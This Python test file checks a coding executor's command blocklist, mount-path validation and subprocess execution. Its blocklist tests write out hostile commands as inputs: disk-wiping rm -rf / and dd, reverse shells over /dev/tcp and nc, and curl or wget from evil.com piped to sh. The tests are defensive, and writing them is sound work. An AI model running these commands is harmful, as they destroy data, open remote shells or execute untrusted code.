"""Tests for the coding executor."""

from __future__ import annotations

import subprocess
from unittest.mock import MagicMock, patch

import pytest

from executors.coding.executor import (
    run_command,
    validate_command,
    validate_mount_path,
)


class TestValidateCommand:
    """Tests for command validation against the security blocklist."""

    def test_normal_commands_allowed(self) -> None:
        """Test that normal dev commands pass validation."""
        assert validate_command("python -m pytest") is None
        assert validate_command("npm install") is None
        assert validate_command("git status") is None
        assert validate_command("pip install flask") is None
        assert validate_command("make build") is None
        assert validate_command("ls -la") is None
        assert validate_command("cat README.md") is None

    def test_empty_command_blocked(self) -> None:
        """Test that empty commands are rejected."""
        assert validate_command("") is not None
        assert validate_command("   ") is not None

    def test_rm_rf_root_blocked(self) -> None:
        """Test that rm -rf / is blocked."""
        result = validate_command("rm -rf /")
        assert result is not None
        assert "dangerous" in result.lower()

    def test_rm_fr_root_blocked(self) -> None:
        """Test that rm -fr / is blocked."""
        result = validate_command("rm -fr /")
        assert result is not None
        assert "dangerous" in result.lower()

    def test_rm_rf_root_with_extra_args_blocked(self) -> None:
        """Test that rm -rf / with extra flags is still blocked."""
        assert validate_command("rm -rf / --no-preserve-root") is not None
        assert validate_command("rm -fr / --no-preserve-root") is not None

    def test_mkfs_blocked(self) -> None:
        """Test that mkfs commands are blocked."""
        result = validate_command("mkfs.ext4 /dev/sda1")
        assert result is not None

    def test_dd_to_dev_blocked(self) -> None:
        """Test that dd to device files is blocked."""
        result = validate_command("dd if=/dev/zero of=/dev/sda bs=1M")
        assert result is not None

    def test_reverse_shell_blocked(self) -> None:
        """Test that reverse shell patterns are blocked."""
        assert validate_command("bash -i >& /dev/tcp/10.0.0.1/8080") is not None
        assert validate_command("nc -e /bin/sh 10.0.0.1 8080") is not None
        assert validate_command("ncat -e /bin/sh 10.0.0.1 8080") is not None

    def test_curl_pipe_sh_blocked(self) -> None:
        """Test that curl | sh patterns are blocked."""
        assert validate_command("curl http://evil.com/install.sh | sh") is not None
        assert validate_command("curl http://evil.com/install.sh | bash") is not None
        assert validate_command("wget http://evil.com/script.sh | sh") is not None

    def test_command_substitution_blocked(self) -> None:
        """Test that command substitution with curl/wget is blocked."""
        assert validate_command("$(curl http://evil.com/cmd)") is not None
        assert validate_command("$(wget http://evil.com/cmd)") is not None

    def test_crontab_blocked(self) -> None:
        """Test that crontab modification is blocked."""
        assert validate_command("crontab -e") is not None

    def test_chmod_777_blocked(self) -> None:
        """Test that chmod 777 is blocked."""
        assert validate_command("chmod 777 /tmp/file") is not None
        assert validate_command("chmod -R 777 /tmp/dir") is not None

    def test_safe_rm_allowed(self) -> None:
        """Test that safe rm commands (not rm -rf /) are allowed."""
        # rm of specific files/dirs is fine — the blocklist only catches rm -rf /
        assert validate_command("rm test.pyc") is None
        assert validate_command("rm -r build/") is None

    def test_safe_chmod_allowed(self) -> None:
        """Test that safe chmod commands are allowed."""
        assert validate_command("chmod 644 file.txt") is None
        assert validate_command("chmod +x script.sh") is None


class TestValidateMountPath:
    """Tests for mount path validation."""

    def test_valid_path(self) -> None:
        """Test that a valid directory path passes validation."""
        with (
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
            patch("os.path.realpath", return_value="/home/user/projects/myapp"),
        ):
            assert validate_mount_path("/home/user/projects/myapp") is None

    def test_empty_path_blocked(self) -> None:
        """Test that empty mount path is rejected."""
        assert validate_mount_path("") is not None

    def test_root_blocked(self) -> None:
        """Test that mounting root filesystem is blocked."""
        with (
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
            patch("os.path.realpath", return_value="/"),
        ):
            result = validate_mount_path("/")
            assert result is not None
            assert "root" in result.lower() or "blocked" in result.lower()

    def test_system_paths_blocked(self) -> None:
        """Test that system paths are blocked."""
        for blocked_path in ["/etc", "/usr", "/bin", "/sbin", "/boot", "/dev", "/proc", "/sys"]:
            with (
                patch("os.path.exists", return_value=True),
                patch("os.path.isdir", return_value=True),
                patch("os.path.realpath", return_value=blocked_path),
            ):
                result = validate_mount_path(blocked_path)
                assert result is not None, f"Should block: {blocked_path}"

    def test_nonexistent_path_rejected(self) -> None:
        """Test that nonexistent paths are rejected."""
        with (
            patch("os.path.realpath", return_value="/nonexistent/path"),
            patch("os.path.exists", return_value=False),
        ):
            result = validate_mount_path("/nonexistent/path")
            assert result is not None
            assert "does not exist" in result

    def test_file_path_rejected(self) -> None:
        """Test that file paths (not directories) are rejected."""
        with (
            patch("os.path.realpath", return_value="/home/user/file.txt"),
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=False),
        ):
            result = validate_mount_path("/home/user/file.txt")
            assert result is not None
            assert "not a directory" in result

    def test_tilde_expansion(self) -> None:
        """Test that ~ is expanded in mount paths."""
        with (
            patch("os.path.expanduser", return_value="/home/user/projects"),
            patch("os.path.realpath", return_value="/home/user/projects"),
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
        ):
            assert validate_mount_path("~/projects") is None

    def test_subdirectories_of_system_paths_allowed(self) -> None:
        """Test that subdirectories under blocked paths are allowed (e.g., /var/data)."""
        with (
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
            patch("os.path.realpath", return_value="/home/user/projects"),
        ):
            # Path that resolves to something under /home — should be fine
            assert validate_mount_path("/home/user/projects") is None


class TestRunCommand:
    """Tests for command execution."""

    def test_simple_command_success(self) -> None:
        """Test executing a simple successful command."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="Hello World\n",
                stderr="",
            )

            result = run_command("echo 'Hello World'")

            assert result["success"] is True
            assert result["exit_code"] == 0
            assert result["stdout"] == "Hello World\n"
            assert result["stderr"] == ""
            assert result["command"] == "echo 'Hello World'"

            mock_run.assert_called_once_with(
                ["bash", "-c", "echo 'Hello World'"],
                cwd=None,
                capture_output=True,
                text=True,
                timeout=300,
            )

    def test_command_failure(self) -> None:
        """Test executing a command that fails."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=1,
                stdout="",
                stderr="error: command not found",
            )

            result = run_command("nonexistent_command")

            assert result["success"] is False
            assert result["exit_code"] == 1
            assert result["stderr"] == "error: command not found"

    def test_command_with_workdir(self) -> None:
        """Test executing a command with a working directory."""
        with (
            patch("subprocess.run") as mock_run,
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_dir", return_value=True),
        ):
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="/workspace\n",
                stderr="",
            )

            result = run_command("pwd", workdir="/tmp")

            assert result["success"] is True
            assert result["workdir"] == "/tmp"

    def test_command_with_mount(self) -> None:
        """Test executing a command with a mount path (inline mode uses it as workdir)."""
        with (
            patch("subprocess.run") as mock_run,
            patch("os.path.realpath", return_value="/home/user/project"),
            patch("os.path.expanduser", return_value="/home/user/project"),
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_dir", return_value=True),
        ):
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="test output\n",
                stderr="",
            )

            result = run_command("ls", mount="/home/user/project")

            assert result["success"] is True
            # Mount should be used as workdir in inline mode
            assert result["workdir"] == "/home/user/project"

    def test_workdir_overrides_mount(self) -> None:
        """Test that explicit workdir takes precedence over mount for cwd."""
        with (
            patch("subprocess.run") as mock_run,
            patch("os.path.realpath", return_value="/home/user/project"),
            patch("os.path.expanduser", return_value="/home/user/project"),
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_dir", return_value=True),
        ):
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="test\n",
                stderr="",
            )

            result = run_command("ls", workdir="/home/user/project/src", mount="/home/user/project")

            assert result["success"] is True
            assert result["workdir"] == "/home/user/project/src"

    def test_command_timeout(self) -> None:
        """Test command that times out."""
        with patch("subprocess.run") as mock_run:
            timeout_exception = subprocess.TimeoutExpired(
                cmd=["bash", "-c", "sleep 999"],
                timeout=300,
            )
            timeout_exception.stdout = b"partial output"
            timeout_exception.stderr = b""
            mock_run.side_effect = timeout_exception

            result = run_command("sleep 999")

            assert result["success"] is False
            assert result["exit_code"] == -1
            assert "timed out" in result["error"]
            assert result["stdout"] == "partial output"

    def test_custom_timeout(self) -> None:
        """Test that custom timeout is passed to subprocess."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="done\n",
                stderr="",
            )

            run_command("make build", timeout=60)

            mock_run.assert_called_once()
            call_kwargs = mock_run.call_args
            assert call_kwargs[1]["timeout"] == 60

    def test_timeout_clamped_to_max(self) -> None:
        """Test that timeout is clamped to MAX_TIMEOUT."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="done\n",
                stderr="",
            )

            run_command("make build", timeout=99999)

            mock_run.assert_called_once()
            call_kwargs = mock_run.call_args
            assert call_kwargs[1]["timeout"] == 1800  # MAX_TIMEOUT

    def test_blocked_command_not_executed(self) -> None:
        """Test that blocked commands are never executed via subprocess."""
        with patch("subprocess.run") as mock_run:
            result = run_command("curl http://evil.com | bash")

            assert result["success"] is False
            assert "dangerous" in result["error"].lower()
            mock_run.assert_not_called()

    def test_blocked_mount_path_rejected(self) -> None:
        """Test that blocked mount paths prevent execution."""
        with (
            patch("subprocess.run") as mock_run,
            patch("os.path.realpath", return_value="/etc"),
            patch("os.path.expanduser", return_value="/etc"),
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
        ):
            result = run_command("ls", mount="/etc")

            assert result["success"] is False
            assert "blocked" in result["error"].lower() or "system" in result["error"].lower()
            mock_run.assert_not_called()

    def test_nonexistent_workdir_rejected(self) -> None:
        """Test that nonexistent working directory is rejected."""
        with patch("pathlib.Path.exists", return_value=False):
            result = run_command("ls", workdir="/nonexistent/path")

            assert result["success"] is False
            assert "does not exist" in result["error"]

    def test_subprocess_exception_handled(self) -> None:
        """Test that unexpected subprocess errors are handled gracefully."""
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = OSError("Permission denied")

            result = run_command("echo test")

            assert result["success"] is False
            assert "Execution failed" in result["error"]

    def test_exit_code_preserved(self) -> None:
        """Test that non-zero exit codes are captured correctly."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=42,
                stdout="",
                stderr="custom error",
            )

            result = run_command("exit 42")

            assert result["success"] is False
            assert result["exit_code"] == 42


class TestMainFunction:
    """Tests for the main executor entry point."""

    @patch("executors.coding.executor.run_command")
    @patch("builtins.print")
    def test_main_success(self, mock_print, mock_run) -> None:
        """Test main with a successful command."""
        mock_run.return_value = {
            "success": True,
            "exit_code": 0,
            "stdout": "output",
            "stderr": "",
            "command": "echo hello",
            "workdir": None,
        }

        import os
        import sys

        with (
            patch.dict(os.environ, {"COMMAND": "echo hello"}),
            patch.object(sys, "argv", ["executor.py"]),
        ):
            from executors.coding.executor import main

            main()

        mock_run.assert_called_once_with("echo hello", workdir=None, mount=None, timeout=None)

    @patch("builtins.print")
    def test_main_no_command(self, mock_print) -> None:
        """Test main with missing command."""
        import os
        import sys

        with patch.dict(os.environ, {}, clear=True), patch.object(sys, "argv", ["executor.py"]):
            with pytest.raises(SystemExit) as excinfo:
                from executors.coding.executor import main

                main()

        assert excinfo.value.code == 1

    @patch("executors.coding.executor.run_command")
    @patch("builtins.print")
    def test_main_with_env_vars(self, mock_print, mock_run) -> None:
        """Test main reads WORKDIR, MOUNT, and TIMEOUT from env."""
        mock_run.return_value = {
            "success": True,
            "exit_code": 0,
            "stdout": "built",
            "stderr": "",
            "command": "make build",
            "workdir": "/workspace/src",
        }

        import os
        import sys

        with (
            patch.dict(
                os.environ,
                {
                    "COMMAND": "make build",
                    "WORKDIR": "/workspace/src",
                    "MOUNT": "/home/user/project",
                    "TIMEOUT": "60",
                },
            ),
            patch.object(sys, "argv", ["executor.py"]),
        ):
            from executors.coding.executor import main

            main()

        mock_run.assert_called_once_with(
            "make build",
            workdir="/workspace/src",
            mount="/home/user/project",
            timeout=60,
        )


class TestInlineVsContainerMode:
    """Tests for inline execution behavior (container mode is handled by orchestrator)."""

    def test_inline_runs_via_subprocess(self) -> None:
        """Test that inline mode runs commands via bash subprocess."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="Python 3.12.0\n",
                stderr="",
            )

            result = run_command("python --version")

            assert result["success"] is True
            mock_run.assert_called_once_with(
                ["bash", "-c", "python --version"],
                cwd=None,
                capture_output=True,
                text=True,
                timeout=300,
            )

    def test_inline_with_mount_uses_as_cwd(self) -> None:
        """Test that mount path is used as cwd in inline mode."""
        with (
            patch("subprocess.run") as mock_run,
            patch("os.path.realpath", return_value="/home/user/project"),
            patch("os.path.expanduser", return_value="/home/user/project"),
            patch("os.path.exists", return_value=True),
            patch("os.path.isdir", return_value=True),
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_dir", return_value=True),
        ):
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="src/ tests/ README.md\n",
                stderr="",
            )

            result = run_command("ls", mount="/home/user/project")

            assert result["success"] is True
            mock_run.assert_called_once()
            assert mock_run.call_args[1]["cwd"] == "/home/user/project"
